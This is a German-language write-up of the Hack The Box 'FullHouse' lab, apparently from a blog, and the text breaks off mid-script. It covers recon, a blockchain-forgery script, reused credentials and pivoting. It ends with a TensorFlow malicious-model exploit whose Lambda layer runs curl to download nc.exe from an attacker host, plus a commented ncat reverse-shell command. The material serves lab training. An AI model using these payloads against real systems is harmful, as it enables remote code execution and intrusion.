---
title: Writeup_FullHouse
date: 2024-01-03 11:45:00 +0100
categories: [HTB, Endgames]
tags: [ligolo-ng, sqsh, chisel, mimikatz, evil-winrm, ncat, sigmapotato, hashcat, smbserver_linux, ilspy, impacket, ffuf]     # TAG names should always be lowercase
author: bumbl0r
comments: false
<author_id>:
  name: bumbl0r
  url: <homepage_of_author>

---

Tools: #fuff , #ligolo-ng , #mimikatz , #evil-winrm , #ncat, #SigmaPotato, #chisel , #sqsh, #hashcat , #smbserver_linux_x86_64, #ilspy , #impacket


```
Introduction

#### FullHouse

By [amra13579](https://app.hackthebox.com/users/123322)

The HTBCasino is laser focused on ensuring the privacy and security of its players. Therefore the casino has hired you to find and report potential vulnerabilities in both new and legacy components.

The goal is to gain a foothold on the internal network, escalate privileges and ultimately compromise the entire infrastructure, while collecting several flags along the way.

This Endgame is designed to test your skills in Enumeration, Code Review, Pivoting, Web Exploitation and other attacking techniques. You must thoroughly prepare yourself for:  

- Source Code Review
- Web Application Attacks
- Reversing
- Windows exploitation
- Active Directory exploitation
- Blockchain exploitation
- AI bypass/exploitation

Entry Point: `10.13.38.31`
```

Fangen wir mit einem nmap scan an

```
┌──(bumble㉿bumble)-[/mnt/backup/HTB_Endgames/FullHouse]
└─$ nmap 10.13.38.31 -sC -sV 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-21 08:05 CET
Nmap scan report for 10.13.38.31
Host is up (0.066s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp    open  http        nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://casino.htb/
9001/tcp  open  nagios-nsca Nagios NSCA
55555/tcp open  http        SimpleHTTPServer 0.6 (Python 3.10.12)
|_http-title: Directory listing for /
|_http-server-header: SimpleHTTP/0.6 Python/3.10.12
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.86 seconds
```

Tragen wir mal das in unsere vhosts Datei ein, und schauen ob wir weitere finden

```
┌──(bumble㉿bumble)-[~]
└─$ ffuf -u 'http://casino.htb' -c -w /mnt/backup/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host:FUZZ.casino.htb' -fw 1,6082

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://casino.htb
 :: Wordlist         : FUZZ: /mnt/backup/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.casino.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1,6082
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 181 req/sec :: Duration: [0:05:42] :: Errors: 0 ::

```

Da finden wir erstmal nichts.

Port 9001 und 55555 bekomme ich keinen Response, somit bleibt nur port 80

Versuchen wir Whatsweb und nikto

![Wappalizer](/assets/Bilder/Endgame_Fullhouse/Pasted%20image%2020231221083440.png){: width="700" height="400" }

```
┌──(bumble㉿bumble)-[~]
└─$ dirsearch -u http://casino.htb/ -r    
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict
/home/bumble/.local/lib/python3.11/site-packages/requests/__init__.py:89: RequestsDependencyWarning: urllib3 (1.26.18) or chardet (3.0.4) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/bumble/reports/http_casino.htb/__23-12-21_08-35-02.txt

Target: http://casino.htb/

[08:35:02] Starting: 
[08:35:24] 302 -  199B  - /dashboard  ->  /login                            
[08:35:34] 200 -    1KB - /login                                            
[08:35:35] 302 -  199B  - /logout  ->  /login                               
[08:35:46] 200 -    1KB - /register                                         
                                                                             
Task Completed
```

Nikto findet auch erstmal nichts

```
┌──(bumble㉿bumble)-[/mnt/backup/HTB_Endgames/FullHouse]
└─$ nikto -h http://casino.htb -C all
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.13.38.31
+ Target Hostname:    casino.htb
+ Target Port:        80
+ Start Time:         2023-12-21 08:35:26 (GMT1)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0 (Ubuntu)
+ /: Retrieved access-control-allow-origin header: *.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the siteing-content-type-header/
+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).


```

Schauen wir uns mal die Webseite im Browser an

![Page](/assets/Bilder/Endgame_Fullhouse/Pasted%20image%2020231221085450.png){: width="700" height="400" }

Wir nutzen die Register Funktion und schauen dann weiter

Nach erfolgreichen Login erhalte ich einen key

![Page1](/assets/Bilder/Endgame_Fullhouse/Pasted%20image%2020231221085553.png){: width="700" height="400" }
schauen wir uns mal die Seiten an wo wir noch sehen

Dashboard

![Page2](/assets/Bilder/Endgame_Fullhouse/Pasted%20image%2020231221085639.png){: width="700" height="400" }

Hier habe ich bei `here` eine zip Datei gefunden

![Page3](/assets/Bilder/Endgame_Fullhouse/Pasted%20image%2020231221085725.png){: width="700" height="400" }

![Page4](/assets/Bilder/Endgame_Fullhouse/Pasted%20image%2020231221085740.png){: width="700" height="400" }

Die erste Challange/Flag hat etwas mit Blockchain zu tun. Schauen wir uns mal die zip Datei an

dort finde ich 3 Dateien block.py, blockchain.py, transaction.py

Nachdem ich die 3 Dateien analysiert habe ist es unser Ziel eine neue Transcation zu erzeugen das wir uns den VIP Zugang kaufen können.
Hierfür habe ich folgendes Script geschrieben

```
import requests
from blockchain import Blockchain, Transaction
from block import Block
import json

TARGET = "http://casino.htb/"
orig_blockchain = requests.get(TARGET + "/view_blockchain").json()

print(orig_blockchain)

bank_address = orig_blockchain["blockchain"][0]["transactions"][0]["receiver_address"]
user_address = orig_blockchain["blockchain"][1]["transactions"][0]["receiver_address"]

#print(bank_address)
#print(user_address)

user_key = "-----BEGIN RSA PRIVATE KEY-----\nMIIEogIBAAKCAQEAsKxl5LoYpZ0b9pRC1KaedVP0F/404+ugY+Rz2JMWzacy1IYo\nMYO/XXU3eoihnMWR3NYKnRo7fXBGL1nwnKpQXSGBHz2TQSk3i+I1CEgCx/ojNPPo\nKC/X9I3RS3IZRcpTHh8wy0Jf7eUl5A/QrnDZrUPgcsgp1NdtnI/si/2uHVqZFXnX\ntPdv+Ji5tkKa02MlKG/pg3E7wBhFevk1UZxaMUgXVf/1tEixlRNrd+wD5zSLV06F\np7y4IFg7eX2Mah6gufx/zuzLXq+0wB6PSVCHJafm7WV40yBXRpnC3X68ChVeAtDi\nBXqksoLEuZOA15giIkdrra4dA1xixVyHqZEQ6QIDAQABAoIBAAhoI68XFd4nlDGP\nC4EP7qFZnddYbs7bovWt5L9M/HxLtPT870Ov57a8QagQgVQy6IZwHvAr0+HbqlNN\nfdAOoKVV102TwgKLQgvjdy+OMaevZOZ7prPm1ulZqDhlVQOHpZ3c0RcS8PqieUOZ\nZw4t64W9oZwEn0zz9VDKXnCo4RSfa0R+WDyZGdJPaxXFPV+I/ePcDpRXSOZLyFXn\nqBbDpSYbKILkYujTFbtJJqsTXGCeiE8NddNjiMkQCOo96HztbKJs/atIR+HueHB8\nsdqFkG/a2cYUiNP4ejf0UWjbogacKXxO1Jd1KLfJMd7jzD8CBhnz1UjSXXueXM7y\nT5U1JHsCgYEA0YqjDbGNK+WEKd5MQT9Mpm+ekCkmGdAI9vUF8anxV+8Y8Gb4Q4qx\nPIq9201Dugc+ofspaGU4YCCxw6Ux9423K8oafEwaKhfr1nXe0HBg/oiXZ6SIwe5l\nMX9f7OlwpJwZQcdlyntiNFwkCXUh4nGa7txcgkf/OpvSzDnZrVxbkMsCgYEA19gz\nSVc+OxfH5dFzUj/0uIaqJ9xBGQY1l10HVgI8Zg9tSP9K3MqSce55W8YtCH2/FLJm\nd/EDKN7eqTmmmexLvv7FpMGA0CIAIi680uacTAmGFOaTASTmo+AOLLV1FXsFlXuL\n2rpDHJF7iFK2ul3CAP6WDS0RvNlo9oZUYxAycpsCgYBJ0Ov10/lmYFk5opz8Uz8+\nVo3mPQi2CSpPTSvF4Vcq4gjID44fxQkAyeNuEP7t1sWCrIb+xsGgY4Qb5uL+UUcY\nvv6rkOeasoibKTTP+vbAU//6O+UNZFzznep9/BJ5eqAPIx5BwUtsJJVxW3kPW3P3\n91sDbjeEPwZ4eVysjJ+ZFwKBgHNrfDlaur9UvyMotnckFhPahwDbqb/c7ylqqLKY\nbX3SAAmJ4plghaEA+cpWldw1icligKLgsWTYkM6DMpCaqAKRMFUi2GPz2ohs37IT\neT671QQ2LCPvfJnjBRFpUxvSdjDyKN4kviB3t0w1ltrfqg9oFAslr5eB1rwFJvj2\nP1PDAoGANdFuBInTCa0g0VE+PO9WMooxJZag8qSWVegFTj7XIUTGQwIomXRqkw67\nDHMjaz8v5rBPdYqN0Pgw0BAL2h1lnmXHCSHn3xvO5wF3Zz0IxkRCKhrPftTcTXy+\nQvHZpzyIj6ZTJQYVWowgAbdGWiSlin0GQA4f7UQvrzQK3HQqDYg=\n-----END RSA PRIVATE KEY-----"


forged_blockchain = Blockchain(bank_address)
forged_blockchain.resolve_conflict(orig_blockchain)
blockchain_length = len(forged_blockchain.blocks)

for i in range(blockchain_length, blockchain_length+1):
    previous_hash = forged_blockchain.blocks[i-1].current_hash
    previous_transaction_id = forged_blockchain.blocks[i-1].transactions[0].transaction_id
    evil_transaction = Transaction(sender_address=user_address, receiver_address=bank_address, amount=-100, transaction_inputs=previous_transaction_id, ids=1)
    evil_transaction.sign_transaction(user_key)

    new_block = Block(index=i, previous_hash=previous_hash, transactions=[evil_transaction], nonce=0)
    forged_blockchain.mine_block(new_block, difficulty=1)

requests.post(TARGET + "/blockchain", proxies={"http":"http://127.0.0.1:8080"}, json=forged_blockchain.to_json())
```

Folgende Schritte sind zu unternehmen.
1. User registrieren
2. key kopieren
3. script laufen lassen
4. vip access kaufen

```┌──(bumble㉿bumble)-[/mnt/backup/HTB_Endgames/FullHouse]
└─$ python3 blockchain_bumble.py        
/home/bumble/.local/lib/python3.11/site-packages/requests/__init__.py:89: RequestsDependencyWarning: urllib3 (1.26.18) or chardet (3.0.4) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
{'blockchain': [{'index': 0, 'nonce': 0, 'previous_hash': 1, 'timestamp': 0, 'transactions': [{'amount': 1000000000, 'change': 0, 'receiver_address': '-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApP6g28sRRXdIh3I5Rphv\nLcRvGUXVqTtjcSq7KJjqCTGHgp0/QBEw4+ITl5UoOITPL7kGJz7yRWwWuP/EswPg\nWA2H8jaPxPHq/uo2CmWtlt+vWVgbvdKarmkiELFrshAOpUG3VPwNwEj8WsimZmfl\nEG2k0vRGw2k0DXpbWtBbghhOpwyc9ghDwBZ3gUpnCTSVcNUmrcxZ1jypRGb1WSQx\nMmUKuc+r/F28rBzhiC6b7+nHfJ4x5sq6dEZMYpzPpWrwV6QfNADZ5HGwjaW69Ut5\nN3Zx69iZYyMwzvM3M1qDapR+ZLTTHZ3DW2wx2fafkoyCLQYrA/Zcjg8dKWGtPiyX\nowIDAQAB\n-----END PUBLIC KEY-----', 'sender_address': '0', 'signature': '', 'transaction_id': '00', 'transaction_inputs': '', 'transaction_outputs': [{'00': ['-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApP6g28sRRXdIh3I5Rphv\nLcRvGUXVqTtjcSq7KJjqCTGHgp0/QBEw4+ITl5UoOITPL7kGJz7yRWwWuP/EswPg\nWA2H8jaPxPHq/uo2CmWtlt+vWVgbvdKarmkiELFrshAOpUG3VPwNwEj8WsimZmfl\nEG2k0vRGw2k0DXpbWtBbghhOpwyc9ghDwBZ3gUpnCTSVcNUmrcxZ1jypRGb1WSQx\nMmUKuc+r/F28rBzhiC6b7+nHfJ4x5sq6dEZMYpzPpWrwV6QfNADZ5HGwjaW69Ut5\nN3Zx69iZYyMwzvM3M1qDapR+ZLTTHZ3DW2wx2fafkoyCLQYrA/Zcjg8dKWGtPiyX\nowIDAQAB\n-----END PUBLIC KEY-----', 1000000000]}], 'user_id': '0'}]}, {'index': 1, 'nonce': 15, 'previous_hash': 'b6536ec8bc84977f7ca1d7a2e63314c6cffdf40ac3eb7ae92a6273352dbfecdaccd41e1ba0dc80b2c837438d34850e95090dc89b5d64c03ec706677b33f3a32c', 'timestamp': 1703190002.3454382, 'transactions': [{'amount': 100, 'change': -100, 'receiver_address': '-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtFqsdBYW40Lta5KNpu+a\nixS0UschpyaBLJldX59xFGMPxJ7skGqQlmf3Mzqk94GGGptli7ZRW/RthKyZdQMi\nVaoGTqs3oFUzyaRZIOcR51Mq2YY3etRPzadGd3nnqV8Sr+lRmnyLfn/NzA/pwrbj\noT0OK4s3EigdLY4oXlwRBhKynN14r9PbzAkK8jrl9CjpZdZxkAmW3G6yNsruyZQh\nHN2ZpfYx1NvoyUUiLtYZAxdY0KN9Yh7W2WkKV/UB/xWp7y7mfHSnvAqg+khULzVP\nXGzvQc0NsA/IaGE0+a32FsateZWUigfb7JWOYDkjqhQYbrKIiJu6Cixn+mb7gRWw\npwIDAQAB\n-----END PUBLIC KEY-----', 'sender_address': '-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApP6g28sRRXdIh3I5Rphv\nLcRvGUXVqTtjcSq7KJjqCTGHgp0/QBEw4+ITl5UoOITPL7kGJz7yRWwWuP/EswPg\nWA2H8jaPxPHq/uo2CmWtlt+vWVgbvdKarmkiELFrshAOpUG3VPwNwEj8WsimZmfl\nEG2k0vRGw2k0DXpbWtBbghhOpwyc9ghDwBZ3gUpnCTSVcNUmrcxZ1jypRGb1WSQx\nMmUKuc+r/F28rBzhiC6b7+nHfJ4x5sq6dEZMYpzPpWrwV6QfNADZ5HGwjaW69Ut5\nN3Zx69iZYyMwzvM3M1qDapR+ZLTTHZ3DW2wx2fafkoyCLQYrA/Zcjg8dKWGtPiyX\nowIDAQAB\n-----END PUBLIC KEY-----', 'signature': 'HJiQ+PNG35l+FLd49QDdxjKpcgKolWgXRnam0llq2/CD4LsMI58yCmJ+XK5R3tgDhVCpCQMjngnHvcIxFDH6GW7amhrR9G6HWG+YX964RKTMG3bxd9DMZPaCiPI/Nq5t+neMUUeHoP50exDThnym/FCHQZN9IapNkci+k0YvMTyqRno3CgDIiiCUJRs2gA9oXBjqS7vUvy84k/OWqFlyftqvN8jef4JWSBjBM//8SW8AGIhpdmLpJvSYMuJ18We5EpdZsGEqQFw+j9GRCLUztiGU/Pxbwesc/69Av09EXdnoi5AhQCLSCR6rG72VShgiYwNdRpV3yU6cxvr1EylGDw==', 'transaction_id': '11', 'transaction_inputs': {'0': 100}, 'transaction_outputs': [{'11': ['-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtFqsdBYW40Lta5KNpu+a\nixS0UschpyaBLJldX59xFGMPxJ7skGqQlmf3Mzqk94GGGptli7ZRW/RthKyZdQMi\nVaoGTqs3oFUzyaRZIOcR51Mq2YY3etRPzadGd3nnqV8Sr+lRmnyLfn/NzA/pwrbj\noT0OK4s3EigdLY4oXlwRBhKynN14r9PbzAkK8jrl9CjpZdZxkAmW3G6yNsruyZQh\nHN2ZpfYx1NvoyUUiLtYZAxdY0KN9Yh7W2WkKV/UB/xWp7y7mfHSnvAqg+khULzVP\nXGzvQc0NsA/IaGE0+a32FsateZWUigfb7JWOYDkjqhQYbrKIiJu6Cixn+mb7gRWw\npwIDAQAB\n-----END PUBLIC KEY-----', 100]}, {'12': ['-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApP6g28sRRXdIh3I5Rphv\nLcRvGUXVqTtjcSq7KJjqCTGHgp0/QBEw4+ITl5UoOITPL7kGJz7yRWwWuP/EswPg\nWA2H8jaPxPHq/uo2CmWtlt+vWVgbvdKarmkiELFrshAOpUG3VPwNwEj8WsimZmfl\nEG2k0vRGw2k0DXpbWtBbghhOpwyc9ghDwBZ3gUpnCTSVcNUmrcxZ1jypRGb1WSQx\nMmUKuc+r/F28rBzhiC6b7+nHfJ4x5sq6dEZMYpzPpWrwV6QfNADZ5HGwjaW69Ut5\nN3Zx69iZYyMwzvM3M1qDapR+ZLTTHZ3DW2wx2fafkoyCLQYrA/Zcjg8dKWGtPiyX\nowIDAQAB\n-----END PUBLIC KEY-----', -100]}], 'user_id': 1}]}]}

```

![Page5](/assets/Bilder/Endgame_Fullhouse/Pasted%20image%2020231221213002.png){: width="700" height="400" }

Wir erhalten einen neuen Menu-Punkt "Slot" 


![Page6](/assets/Bilder/Endgame_Fullhouse/Pasted%20image%2020231221213102.png){: width="700" height="400" }

![Page7](/assets/Bilder/Endgame_Fullhouse/Pasted%20image%2020231221212143.png){: width="700" height="400" }


Schauen wir uns das mal in BURP an


![Page8](/assets/Bilder/Endgame_Fullhouse/Pasted%20image%2020231221212102.png){: width="700" height="400" }

Ich finde ein User:Password kombi im Header.
slots_test:spVs9gvsk8p8lVJ

ich versuche mit den creds per ssh anzumelden. Klappt leider nicht. Aber auf der http://casino.htb seite wird von einer Cassandra Lead Developer gesprochen. Versuchen wir mal diese kombitnation

cassandra:spVs9gvsk8p8lVJ


```
┌──(bumble㉿bumble)-[/mnt/backup/HTB_Endgames/FullHouse]
└─$ ssh cassandra@casino.htb
cassandra@casino.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Dec 21 08:19:12 PM UTC 2023

  System load:           0.0
  Usage of /:            71.5% of 5.62GB
  Memory usage:          9%
  Swap usage:            0%
  Processes:             163
  Users logged in:       2
  IPv4 address for eth0: 10.13.38.31
  IPv6 address for eth0: dead:beef::250:56ff:feb9:3f48
  IPv4 address for eth1: 10.0.52.31


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Dec 21 08:29:00 2023 from 10.10.15.107
cassandra@casino:~$ ls
flag.txt
cassandra@casino:~$ cat flag.txt 
FHS{b4l4nc3_4ll_z3r0s_fr0m_sl0t5}
```

Flag1 
FHS{b4l4nc3_4ll_z3r0s_fr0m_sl0t5}

Linpeas hat mir keine Ergebnisse geliefert, also habe ich mir die tun interfaces angeschaut und nmap gestartet
Damit das einfach geht habe ich ligolo-ng benutzt

```
cassandra@casino:~$ wget http://10.10.14.5/ligolo-ng/agent
--2023-12-22 11:30:20--  http://10.10.14.5/ligolo-ng/agent
Connecting to 10.10.14.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4669440 (4.5M) [application/octet-stream]
Saving to: ‘agent’

agent                        100%[==============================================>]   4.45M  2.29MB/s    in 1.9s    

2023-12-22 11:30:22 (2.29 MB/s) - ‘agent’ saved [4669440/4669440]

cassandra@casino:~$ chmod +x agent 
cassandra@casino:~$ ./agent -connect 10.10.14.5:443 -ignore-cert


┌──(bumble㉿bumble)-[/mnt/backup/Linux-tools/ligolo-ng]
└─$ ./proxy -selfcert -laddr 0.0.0.0:443 
WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
INFO[0000] Listening on 0.0.0.0:443                     
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

Made in France ♥ by @Nicocha30!

ligolo-ng » INFO[0315] Agent joined.                                 name=cassandra@casino remote="10.13.38.31:56686"
ligolo-ng » session
? Specify a session : 1 - cassandra@casino - 10.13.38.31:56686
[Agent : cassandra@casino] » start
[Agent : cassandra@casino] » INFO[0323] Starting tunnel to cassandra@casino          


```

Nun kann ich von meinem Kali System einen scan durchführen

```

┌──(bumble㉿bumble)-[~]
└─$ nmap 10.0.52.0/24                
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-22 09:48 CET
Nmap scan report for 10.0.52.2
Host is up (0.060s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Nmap scan report for 10.0.52.5
Host is up (0.061s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
554/tcp open  rtsp

Nmap scan report for 10.0.52.31
Host is up (0.062s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for 10.0.52.111
Host is up (0.067s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT    STATE SERVICE
443/tcp open  https

Nmap done: 256 IP addresses (4 hosts up) scanned in 22.76 seconds

```

Detail scan


```
┌──(bumble㉿bumble)-[~]
└─$ nmap 10.0.52.5 -sC -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-22 09:49 CET
Nmap scan report for 10.0.52.5
Host is up (0.066s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 9.3 (FreeBSD 20230316; protocol 2.0)
| ssh-hostkey: 
|   3072 da:27:2d:b4:15:43:bf:71:21:50:a8:b5:e7:3f:fa:10 (RSA)
|   256 fb:cf:94:03:5b:a4:1c:85:b4:51:94:26:7c:cf:6e:0f (ECDSA)
|_  256 f6:0d:01:16:88:0f:c5:45:8d:67:6d:f3:63:11:8f:7c (ED25519)
554/tcp open  rtsp    GStreamer rtspd
|_rtsp-methods: OPTIONS, DESCRIBE, ANNOUNCE, GET_PARAMETER, PAUSE, PLAY, RECORD, SETUP, SET_PARAMETER, TEARDOWN
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.34 seconds
                                                                                                                                                                                                                                            
┌──(bumble㉿bumble)-[~]
└─$ nmap 10.0.52.111 -sC -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-22 09:50 CET
Nmap scan report for 10.0.52.111
Host is up (0.079s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Microsoft IIS httpd 10.0
|_http-title: Voice Authentication
|_ssl-date: 2023-12-22T08:50:50+00:00; 0s from scanner time.
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=Vault
| Subject Alternative Name: DNS:Vault
| Not valid before: 2023-12-04T19:50:40
|_Not valid after:  2033-12-04T20:00:40
| tls-alpn: 
|_  http/1.1
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.17 seconds
                                                                                                                                                                                                                                            
┌──(bumble㉿bumble)-[~]
└─$ nmap 10.0.52.2 -sC -sV  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-22 09:51 CET
Nmap scan report for 10.0.52.2
Host is up (0.074s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-22 08:51:33Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fullhouse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fullhouse.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DC, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:f8:ed (VMware)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-12-22T08:51:37
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.87 seconds

```

Schauen wir uns zu erst die 52.5 an
https://book.hacktricks.xyz/network-services-pentesting/554-8554-pentesting-rtsp

https://www.ueberwachungskamera-berater.de/artikel/rtsp-stream-oeffnen-mit-vlc

```
┌──(bumble㉿bumble)-[~]
└─$ nmap 10.0.52.5 -sC --script rtsp-* -p 554
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-22 11:38 CET
Nmap scan report for 10.0.52.5
Host is up (0.067s latency).

PORT    STATE SERVICE
554/tcp open  rtsp
|_rtsp-methods: OPTIONS, DESCRIBE, ANNOUNCE, GET_PARAMETER, PAUSE, PLAY, RECORD, SETUP, SET_PARAMETER, TEARDOWN
| rtsp-url-brute: 
|   discovered: 
|_    rtsp://10.0.52.5/mpeg4

Nmap done: 1 IP address (1 host up) scanned in 4.09 seconds
```

Versuchen wir das mal im VLC Player

![[Pasted image 20231222131949.png]]

Es wird ein kleines Video gezeigt, dort ist ein Password lessbar

![[Pasted image 20231222132016.png]]

```
4vQ03013nKj9
```

Ich versuche das passwort mal zu missbrauchen

```
cassandra@casino:~$ su root
Password: 
root@casino:/home/cassandra# ls
agent  flag.txt
root@casino:/home/cassandra# cd /root/
root@casino:~# ls
flag.txt
root@casino:~# cat flag.txt
FHS{1_th1nk_w3_4r3_b31ng_w4tch3d_O.O}

```

Flag2 FHS{1_th1nk_w3_4r3_b31ng_w4tch3d_O.O}

Schauen wir uns mal auf der 52.111 an

![[Pasted image 20231227102101.png]]

Wenn ich mir das so anschaue kann ich über die Mikrofon funktion mit dem Wort "keyboard" etwas freischalten.
Leder steht mir in meiner Promox Umgebung kein Microfon zur Verfügung.
Ich finde aber im Quellcode das ich die Datei auch hochladen kann

![[Pasted image 20231227102343.png]]

Also habe ich mit google folgende Seite gefunden und mir meine eigene .wav Datei erzeugt.


https://voicemaker.in/

![[Pasted image 20231227102412.png]]

Bearbeiten wir mal im "Inspector" den Code das wir die Upload Funktion erhalten

![[Pasted image 20231227102747.png]]

Das klappt super. 
Ich lande im einem Dashboard

![[Pasted image 20231227103053.png]]

Flag 3 FHS{n0w_th3y_4r3_l1st3n1ng_t00}

Der nächste Hint für ist in "in Progress" zu finden. Hier steht das wir ein  Tensorflow-Model erzeugen sollen wo die Roulette an Table 3 überprüfen soll.

https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model

Hierzu haben wir folgendes mit google gefunden.

Da wir einen Pivot haben ist mein Entry die ssh-Verbindung von cassandra. Versuchen wir mal ob wir Code-Execution bekommen

```
import tensorflow as tf

def exploit(x):
    import os
    os.system('curl http://10.0.52.31:9001/bumble')
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("bumble2.h5")
```

![[Pasted image 20231227104800.png]]

Das klappt super.

Da die 52.111 eine Windows Maschine ist muss ich meinen Payload für eine Reverse-Shell anpassen und tools wie ncat.exe SSH kopieren.


```
import tensorflow as tf

def exploit(x):
    import os
    os.system(f"curl --connect-timeout 1 -o C:\\Windows\\Temp\\bumble.exe http://10.0.52.31:9001/nc.exe")
    #os.system(f"C:\\Windows\\Temp\\bumble.exe -e powershell 10.0.52.31 1337")
